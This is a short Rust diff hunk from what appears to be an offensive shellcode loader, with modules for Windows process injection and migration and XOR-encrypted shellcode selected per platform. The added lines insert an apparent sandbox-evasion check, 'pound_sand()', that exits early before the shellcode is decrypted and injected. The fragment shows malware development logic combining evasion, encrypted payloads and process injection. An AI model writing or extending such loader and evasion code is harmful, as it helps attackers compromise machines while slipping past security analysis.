@@ -12,6 +12,9 @@ mod rco_process_migration_windows;
 use rco_process_migration_windows::inject_and_migrate;
 
 fn main() {
+    if rco_utils::pound_sand() {
+        return
+    }
     if cfg!(feature = "xor") {
         let (shellcode, target_process) = if cfg!(windows) {
             (rco_config::ENCRYPTED_WINDOWS_SHELLCODE, rco_config::ENCRYPTED_WINDOWS_MIGRATION_TARGET)
